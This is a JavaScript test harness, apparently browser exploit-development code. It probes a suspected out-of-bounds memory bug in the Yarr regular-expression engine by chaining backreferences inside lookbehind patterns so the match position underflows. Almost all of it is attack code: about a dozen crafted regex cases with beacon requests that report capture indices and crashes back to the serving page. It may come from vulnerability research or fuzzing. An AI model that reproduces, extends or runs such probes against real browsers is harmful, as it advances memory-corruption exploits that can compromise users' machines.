// p238 — Yarr C3: chain multiple backreferences to compound position corruption
// Each failed backreference in backward mode corrupts position by -1 code unit.
// Chain N backreferences → corrupt by -N. If pos wraps unsigned → reread() OOB.
// Use /d flag to read raw capture indices from output[].

(function() {
  var B = "V238-";
  function beacon(tag) {
    try { new Image().src = "/BEACON?" + B + tag + "&t=" + Date.now(); } catch(e) {}
  }
  function hexCP(s) {
    if (s === undefined) return "undef";
    if (s === null) return "null";
    if (typeof s === "number") return "n" + s;
    var r = [];
    for (var i = 0; i < s.length && i < 20; i++)
      r.push(s.charCodeAt(i).toString(16).padStart(4, "0"));
    return r.join("-") || "empty";
  }

  beacon("START");

  // Build a regex with N chained backrefs: (?<=\u{10000}\1*(a1)\2*(a2)...\N*(aN))b
  // Each \K* fails once (BMP capture vs surrogate position), corrupting pos by -1.
  // Total corruption: -N code units.
  function buildChain(n) {
    var pat = "(?<=\\u{10000}";
    for (var i = 1; i <= n; i++) {
      pat += "\\" + i + "{0,}(a)";
    }
    pat += ")b";
    return pat;
  }

  // Build input: \u{10000} + "a".repeat(n) + "b"
  function buildInput(n) {
    return "\u{10000}" + "a".repeat(n) + "b";
  }

  // === A: Chain of 2 (baseline — same as C3 trigger) ===
  try {
    var re = new RegExp(buildChain(2), "ud");
    var inp = buildInput(2);
    var m = re.exec(inp);
    if (m && m.indices) {
      beacon("A-HIT-n2");
      for (var i = 0; i < m.indices.length && i <= 4; i++) {
        var idx = m.indices[i];
        if (idx) beacon("A-I" + i + "-" + idx[0] + "to" + idx[1]);
        else beacon("A-I" + i + "-undef");
      }
    } else {
      beacon("A-" + (m ? "NOIDX" : "NULL") + "-n2");
    }
  } catch(e) { beacon("A-ERR-" + e.message.slice(0,50)); }

  // === B: Chain of 5 ===
  try {
    var re = new RegExp(buildChain(5), "ud");
    var inp = buildInput(5);
    var m = re.exec(inp);
    if (m && m.indices) {
      beacon("B-HIT-n5");
      for (var i = 0; i < m.indices.length && i <= 6; i++) {
        var idx = m.indices[i];
        if (idx) beacon("B-I" + i + "-" + idx[0] + "to" + idx[1]);
        else beacon("B-I" + i + "-undef");
      }
    } else {
      beacon("B-" + (m ? "NOIDX" : "NULL") + "-n5");
    }
  } catch(e) { beacon("B-ERR-" + e.message.slice(0,50)); }

  // === C: Chain of 10 ===
  try {
    var re = new RegExp(buildChain(10), "ud");
    var inp = buildInput(10);
    var m = re.exec(inp);
    if (m && m.indices) {
      beacon("C-HIT-n10");
      for (var i = 0; i < m.indices.length && i <= 11; i++) {
        var idx = m.indices[i];
        if (idx) beacon("C-I" + i + "-" + idx[0] + "to" + idx[1]);
        else beacon("C-I" + i + "-undef");
      }
    } else {
      beacon("C-" + (m ? "NOIDX" : "NULL") + "-n10");
    }
  } catch(e) { beacon("C-ERR-" + e.message.slice(0,50)); }

  // === D: Chain of 20 ===
  try {
    var re = new RegExp(buildChain(20), "ud");
    var inp = buildInput(20);
    var m = re.exec(inp);
    if (m && m.indices) {
      beacon("D-HIT-n20");
      for (var i = 0; i <= 3; i++) {
        var idx = m.indices[i];
        if (idx) beacon("D-I" + i + "-" + idx[0] + "to" + idx[1]);
        else beacon("D-I" + i + "-undef");
      }
      // Report last few captures
      for (var i = m.indices.length - 3; i < m.indices.length; i++) {
        var idx = m.indices[i];
        if (idx) beacon("D-I" + i + "-" + idx[0] + "to" + idx[1]);
        else beacon("D-I" + i + "-undef");
      }
    } else {
      beacon("D-" + (m ? "NOIDX" : "NULL") + "-n20");
    }
  } catch(e) { beacon("D-ERR-" + e.message.slice(0,50)); }

  // === E: Non-BMP capture variant (should succeed — no corruption) ===
  // Compare: (?<=(\u{10000})\1{0,}(a))b — group 1 captures non-BMP
  try {
    var re = /(?<=(\u{10000})\1{0,}(a))b/ud;
    var inp = "\u{10000}ab";
    var m = re.exec(inp);
    if (m && m.indices) {
      beacon("E-HIT");
      for (var i = 0; i < m.indices.length; i++) {
        var idx = m.indices[i];
        if (idx) beacon("E-I" + i + "-" + idx[0] + "to" + idx[1]);
        else beacon("E-I" + i + "-undef");
      }
    } else {
      beacon("E-" + (m ? "NOIDX" : "NULL"));
    }
  } catch(e) { beacon("E-ERR-" + e.message.slice(0,50)); }

  // === F: Test if chained pattern with higher N causes crash ===
  // Crash = position went OOB and reread() hit unmapped memory
  try {
    var re = new RegExp(buildChain(50), "u");
    var inp = buildInput(50);
    var m = re.exec(inp);
    beacon("F-n50-" + (m === null ? "NULL" : "HIT"));
  } catch(e) { beacon("F-ERR-" + e.message.slice(0,50)); }

  // === G: Chain of 100 ===
  try {
    var re = new RegExp(buildChain(99), "u");
    var inp = buildInput(99);
    var m = re.exec(inp);
    beacon("G-n99-" + (m === null ? "NULL" : "HIT"));
  } catch(e) { beacon("G-ERR-" + e.message.slice(0,50)); }

  // === H: Observe captures via replace callback for chain of 5 ===
  try {
    var re = new RegExp(buildChain(5), "u");
    var inp = buildInput(5);
    var caps = [];
    inp.replace(re, function() {
      for (var i = 0; i < arguments.length; i++) {
        var v = arguments[i];
        if (typeof v === "string") caps.push(i + "S" + hexCP(v));
        else caps.push(i + "N" + v);
      }
      return "X";
    });
    if (caps.length > 0) {
      beacon("H-FIRE");
      for (var ci = 0; ci < caps.length && ci < 10; ci++)
        beacon("H-" + caps[ci]);
    } else {
      beacon("H-NOFIRE");
    }
  } catch(e) { beacon("H-ERR-" + e.message.slice(0,50)); }

  // === I: Specifically target unsigned underflow ===
  // Place input so position starts near 0, chain corrupts past 0
  // Input: "\u{10000}ab" — only 4 code units total
  // Lookbehind starts at position 3 (before 'b')
  // After matching backward: position near 0
  // Chain corrupts by -N beyond 0 → unsigned wrap
  try {
    var re = /(?<=\u{10000}\1{0,}(a)\2{0,}(a))b/ud;
    var inp = "\u{10000}aab";
    var m = re.exec(inp);
    if (m && m.indices) {
      beacon("I-HIT");
      for (var i = 0; i < m.indices.length; i++) {
        var idx = m.indices[i];
        if (idx) beacon("I-I" + i + "-" + idx[0] + "to" + idx[1]);
        else beacon("I-I" + i + "-undef");
      }
    } else {
      beacon("I-" + (m ? "NOIDX" : "NULL"));
    }
  } catch(e) { beacon("I-ERR-" + e.message.slice(0,50)); }

  // === J: Single backreference to short input — minimal case for wrap ===
  // 2 code units: "\u{10000}" = [D800, DC00]
  // Try to lookbehind from after the pair with a BMP backreference
  try {
    var re = /(?<=(.)\1)\u{10000}/u;
    var inp = "aa\u{10000}";
    var m = re.exec(inp);
    beacon("J-" + (m === null ? "NULL" : "HIT-idx" + m.index));
  } catch(e) { beacon("J-ERR-" + e.message.slice(0,50)); }

  // === K: Position observation via matchAll ===
  // Run the C3 trigger repeatedly to see if any iteration succeeds
  try {
    var re = /(?<=\u{10000}\1*(a))b/gu;
    var inp = ("\u{10000}ab").repeat(20);
    var hits = 0;
    var m;
    while ((m = re.exec(inp)) !== null && hits < 30) {
      beacon("K-HIT" + hits + "-idx" + m.index);
      hits++;
    }
    if (hits === 0) beacon("K-NOHITS");
    else beacon("K-TOTAL-" + hits);
  } catch(e) { beacon("K-ERR-" + e.message.slice(0,50)); }

  beacon("DONE");
})();
